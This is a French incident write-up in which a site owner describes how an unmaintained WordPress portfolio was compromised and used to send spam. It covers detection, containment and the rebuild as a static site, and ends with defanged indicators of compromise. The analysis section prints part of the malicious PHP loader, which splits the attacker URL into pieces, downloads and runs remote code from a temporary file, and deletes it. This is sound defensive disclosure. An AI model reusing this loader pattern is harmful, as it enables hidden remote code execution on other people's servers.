Compromission de mon ancien site : de l’alerte à la remise à plat

Mon portfolio WordPress, construit pendant le BTS puis laissé sans mises à jour, a servi pendant des mois à envoyer du spam. Voici comment je l’ai détecté, ce que j’ai trouvé, et comment j’ai reconstruit un site qui ne peut plus être utilisé de cette façon.

En résumé

Détection
Alertes de l’hébergeur : envoi massif d’e-mails par PHP, puis volume anormal de requêtes sortantes.
Cause
Un chargeur PHP déposé dans le site, très probablement via une extension WordPress jamais mise à jour.
Durée d’exposition
Au moins trois mois : le fichier malveillant datait de mi-août.
Impact
Hébergement utilisé pour du spam. Aucun signe de compromission du compte OVHcloud ni des accès FTP.
Résolution
Suppression complète, site statique reconstruit, PHP bloqué, déploiement par Git avec relecture obligatoire.

Chronologie

  1. Mars 2024

    Installation de WordPress en un clic pour le BTS. Après l’examen, plus aucune mise à jour du cœur ni des extensions.

  2. Août 2026 au plus tard

    Dépôt d’un fichier PHP inconnu à la racine du site. Sa date de modification est le seul repère sur le début de la compromission.

  3. Novembre 2026

    OVHcloud détecte un volume anormal d’e-mails envoyés via PHP et bloque l’envoi, puis bloque aussi les requêtes sortantes de l’hébergement.

  4. 19 et 20 novembre

    Vérification du compte, changement des accès, suppression de WordPress et de sa base, inventaire des fichiers restants, découverte et analyse du chargeur, mise en ligne d’un site statique.

  5. 25 novembre

    Levée des dernières mesures de sécurité et mise en place du déploiement depuis GitHub.

1. Contenir : couper les accès avant de nettoyer

Supprimer les fichiers infectés ne sert à rien si l’attaquant peut revenir par un autre accès. J’ai donc commencé par le compte de l’hébergeur, puis l’hébergement lui-même :

  • double authentification active sur le compte OVHcloud, codes de secours générés ;
  • journal des connexions, utilisateurs secondaires, clés API et clés SSH du compte : rien d’inconnu ;
  • mot de passe FTP changé, un seul utilisateur, aucune tâche planifiée (cron) ;
  • sur GitHub, révocation des applications tierces que je n’utilisais plus.

2. Éradiquer : repartir de zéro plutôt que désinfecter

Le site n’avait plus de valeur et le point d’entrée n’était pas identifié avec certitude. Nettoyer un WordPress compromis aurait laissé un doute permanent : j’ai tout supprimé, module, fichiers et base de données.

La leçon de cette étape est venue de l’inventaire qui a suivi. La suppression automatique du module n’avait pas vidé le dossier du site : elle retire ce que l’hébergeur a installé, pas ce qu’un attaquant a ajouté. Il restait un fichier, links-xml.php, que rien ne rattachait à WordPress.

3. Analyser le fichier restant

Lu dans un éditeur de texte, sans jamais l’exécuter, le fichier se révèle être un chargeur de code à distance. Il ne contient rien de visiblement malveillant : le vrai programme reste chez l’attaquant.

$_u = 'ht' . 'tp' . ':/' . '/';          // adresse découpée en morceaux
$_h = 'lx' . 'ml' . '.ah' . 'kj' . '.lo' . 'l'; // pour échapper aux antivirus
// … télécharge un fichier texte depuis ce serveur …
@file_put_contents($_tf, $_code);  // l’écrit dans un fichier temporaire
@include($_tf);                    // l’exécute
@unlink($_tf);                     // puis efface la trace
  1. L’adresse est découpée en petits morceaux pour ne pas être repérée par une recherche de chaînes suspectes.
  2. À chaque appel, il télécharge du code PHP depuis le serveur de l’attaquant.
  3. Il l’exécute depuis un fichier temporaire, puis le supprime.
  4. Ses messages d’erreur, en anglais et en chinois, sont typiques des kits de spam vendus clés en main.

Ce fonctionnement explique les deux alertes : les requêtes sortantes servaient à récupérer le code, et ce code envoyait le spam. L’attaquant pouvait changer de charge utile à tout moment, sans retoucher au fichier.

Les autres éléments vérifiés étaient sains : le .htaccess était celui de WordPress, sans redirection ajoutée, et les fichiers de configuration du compte étaient ceux d’origine.

4. Reconstruire en réduisant la surface d’attaque

Plutôt que de réinstaller un CMS, j’ai choisi un site entièrement statique. Chaque mesure répond à une étape de l’attaque :

Ce que l’attaque utilisaitCe qui l’empêche aujourd’hui
Une extension WordPress vulnérablePlus de CMS, plus d’extension, plus de base de données
Un fichier PHP déposé dans le siteToute exécution de PHP est refusée par le serveur (erreur 403)
L’envoi d’e-mails par PHPEnvoi de mails par script désactivé sur l’hébergement
Des fichiers ajoutés en douceLe site est redéployé depuis Git : le dépôt est la seule source de vérité
Un site jamais surveilléEn-têtes de sécurité stricts, notés A+ sur securityheaders.com

Le déploiement suit lui aussi le principe du moindre privilège : la branche principale est verrouillée, chaque modification passe par une pull request que je relis, l’hébergeur ne fait que lire un dépôt public, et aucun mot de passe ni aucune clé n’est stocké pour déployer.

Ce que j’en retiens

  • Un site oublié reste exposé. Ce qui est en ligne doit avoir un responsable et un rythme de mises à jour, ou être supprimé.
  • Couper les accès avant de nettoyer, sinon le nettoyage ne tient pas.
  • Vérifier ce que l’outil de suppression laisse derrière lui. C’est l’inventaire manuel qui a permis de trouver le chargeur.
  • Moins de composants, moins de failles. Un portfolio n’a besoin ni de PHP, ni de base de données, ni d’envoi de mails.

Limite de cette analyse : je n’ai pas exploité les journaux d’accès antérieurs à la suppression. La porte d’entrée par une extension non mise à jour est l’hypothèse la plus probable, pas un fait démontré.

Indicateurs de compromission

Pour ceux qui retrouveraient la même chose sur leur hébergement. Les adresses sont volontairement neutralisées.

  • Fichierlinks-xml.php, environ 1,4 Ko, à la racine du site
  • Domaine contactélxml[.]ahkj[.]lol
  • Ressource téléchargée/links-xml-plus.txt
  • Fichiers temporairesfichiers cachés nommés .t suivi de 8 caractères
